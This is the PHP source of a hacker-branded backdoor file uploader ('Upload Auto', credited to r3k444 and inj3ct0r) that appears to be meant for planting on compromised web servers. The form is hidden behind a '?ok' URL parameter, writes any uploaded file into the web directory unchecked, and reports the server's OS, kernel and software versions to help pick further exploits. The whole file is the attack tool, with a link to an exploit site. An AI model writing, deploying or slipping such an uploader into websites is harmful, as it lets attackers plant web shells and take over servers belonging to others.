<?php
define("UPLOAD_DIR", "./");
define("ERROR", "STOP! Error time! I have no idea what caused this." );

function getsystem()
{
	return php_uname('s')." ".php_uname('r')." ".php_uname('v');
};	

function getserver()
{
	return getenv("SERVER_SOFTWARE");
};


function getuser()
{
$out = get_current_user();	
	if($out!="SYSTEM")
		{
			if(($out=ex('id'))==''){$out = "uid=".getmyuid()."(".get_current_user().") gid=".getmygid();};
		}
return $out;
};


// The upload form
if ( isset($_GET['ok']) )
{
?>
    <html>
    <head>
    <title>Upload Auto - by  r3k444</title> 
    </head>
    <body style="background-image: url('http://i.imgur.com/zHNCk2e.gif'); background-repeat: repeat; background-position: center; background-attachment: fixed;">
     
    <STYLE>
    textarea{background-color:#105700;color:lime;font-weight:bold;font-size: 20px;font-family: Tahoma; border: 1px solid #000000;}
    input{FONT-WEIGHT:normal;background-color: #105700;font-size: 15px;font-weight:bold;color: lime; font-family: Tahoma; border: 1px solid #666666;height:20}
    body {
    font-family: Tahoma
    }
    tr {
    BORDER: dashed 1px #333;
    color: #FFF;
    }
    td {
    BORDER: dashed 1px #333;
    color: #FFF;
    }
    .table1 {
    BORDER: 0px Black;
    BACKGROUND-COLOR: Black;
    color: #FFF;
    }
    .td1 {
    BORDER: 0px;
    BORDER-COLOR: #333333;
    font: 7pt Verdana;
    color: Green;
    }
    .tr1 {
    BORDER: 0px;
    BORDER-COLOR: #333333;
    color: #FFF;
    }
    table {
    BORDER: dashed 1px #333;
    BORDER-COLOR: #333333;
    BACKGROUND-COLOR: Black;
    color: #FFF;
    }
    input {
    border                  : dashed 1px;
    border-color            : #333;
    BACKGROUND-COLOR: Black;
    font: 8pt Verdana;
    color: Red;
    }
    select {
    BORDER-RIGHT:  Black 1px solid;
    BORDER-TOP:    #DF0000 1px solid;
    BORDER-LEFT:   #DF0000 1px solid;
    BORDER-BOTTOM: Black 1px solid;
    BORDER-color: #FFF;
    BACKGROUND-COLOR: Black;
    font: 8pt Verdana;
    color: Red;
    }
    submit {
    BORDER:  buttonhighlight 2px outset;
    BACKGROUND-COLOR: Black;
    width: 30%;
    color: #FFF;
    }
    textarea {
    border                  : dashed 1px #333;
    BACKGROUND-COLOR: Black;
    font: Fixedsys bold;
    color: #999;
    }
    BODY {
            SCROLLBAR-FACE-COLOR: Black; SCROLLBAR-HIGHLIGHT-color: #FFF; SCROLLBAR-SHADOW-color: #FFF; SCROLLBAR-3DLIGHT-color: #FFF; SCROLLBAR-ARROW-COLOR: Black; SCROLLBAR-TRACK-color: #FFF; SCROLLBAR-DARKSHADOW-color: #FFF
    margin: 1px;
    color: Red;
    background-color: Black;
    }
    .main {
    margin                  : -287px 0px 0px -490px;
    BORDER: dashed 1px #333;
    BORDER-COLOR: #333333;
    }
    .tt {
    background-color: Black;
    }
     
    A:link {
            COLOR: White; TEXT-DECORATION: none
    }
    A:visited {
            COLOR: White; TEXT-DECORATION: none
    }
    A:hover {
            color: Red; TEXT-DECORATION: none
    }
    A:active {
            color: Red; TEXT-DECORATION: none
    }
     
    #result{margin:10px;}
    #result span{display:block;}
    #result .Y{background-color:green;}
    #result .X{background-color:red;}
    </STYLE>
    <script language=\'javascript\'>
    function hide_div(id)
    {
      document.getElementById(id).style.display = \'none\';
      document.cookie=id+\'=0;\';
    }
    function show_div(id)
    {
      document.getElementById(id).style.display = \'block\';
      document.cookie=id+\'=1;\';
    }
    function change_divst(id)
    {
      if (document.getElementById(id).style.display == \'none\')
        show_div(id);
      else
        hide_div(id);
    }
    </script>
    </td></table></tr>
    <br>
    <br>
    <link rel="stylesheet" type="text/css" href="http://fonts.googleapis.com/css?family=Audiowide">
        <style>
          body {
            font-family: 'Audiowide', serif;
            font-size: 30px;
                   
          }
        </style>
      </head>
     
      <body onLoad="type_text()" ; bgColor=#000000 text=#00FFFF background="Fashion fuchsia">
        <center>
    <font face="Audiowide" color="red">Upload Auto <font color="green">(r3k444)</font>
    <br>
    <font color="white" size="4">[<?php echo getserver();?>. <= </font><font color="green" size="4">5.2.8</font><font color="white" size="4">]</font>
	<br>
    <font color="white" size="4">[<font color="green" size="4"><?php echo php_uname() ; ?></font><font color="white" size="4">]</font>
    </font>
	<br>
	
    </font>
    <br><br>
     
    <table border=1 bordercolor=red>
    <tr>
    <td width="700">
    <br />
    <center>
	
 <form action="" method="POST" enctype="multipart/form-data">
 &nbsp;Uploder File : &nbsp;&nbsp;
<input type="file" class="form-control upload-btn" placeholder="File" name="myFile" id="myFile" multiple/>
<input type="submit" value="Upload"/>
<br />
 
 
 
 
<?php

// File upload action
  if ($_SERVER["REQUEST_METHOD"] == "POST" && !empty($_FILES["myFile"])) {
    $myFile = $_FILES["myFile"];
    if ($myFile["error"] !== UPLOAD_ERR_OK) {
        echo "STOP! Error time! I have no idea what caused this.";
         
    }
    // Check the filename is safe
    $name = preg_replace("/[^A-Z0-9._-]/i", "_", $myFile["name"]);

    // Grab file from the temp dir
    $success = move_uploaded_file($myFile["tmp_name"], UPLOAD_DIR . $name);
    if (!$success) {
		     echo "<br /><br /><font color=\"red\">Sorry, Error time! ...</font>";
                                            echo '<span class="Y">';
                                            echo "<pre></pre></span><br />";  
         
    }
	else{
	echo " <br/> ";
          echo "<br /><font color=\"green\">Successfully...</font>";
                                            echo '<span class="Y">';
                                            echo "<pre>Congratulations! File <a href=$name>Click</a> Uploaded Successfully</pre></span><br />";
											
	}
	
	
	
}	
	
?>
    </center>
    </td>
    </table>
    <br /><br />
    <font face="Audiowide" color="red" size="2">
    Coded by: <font color="white">inj3ct0r</font> <font color="white">|</font> Skype: <font color="white"><a href="Skype:inj3ct0r">inj3ct0r</a></font><br /><br />
    <br > <font color="green">For more tools/scripts/exploits/etc.</font>
    <br />visit <a href="http://inj3ct0r.net" target="_blank" style="text-decoration: none;">www.inj3ct0r.net</a>
    </font>
     
    </center>
    </body>
    </html>

<?php
}
?>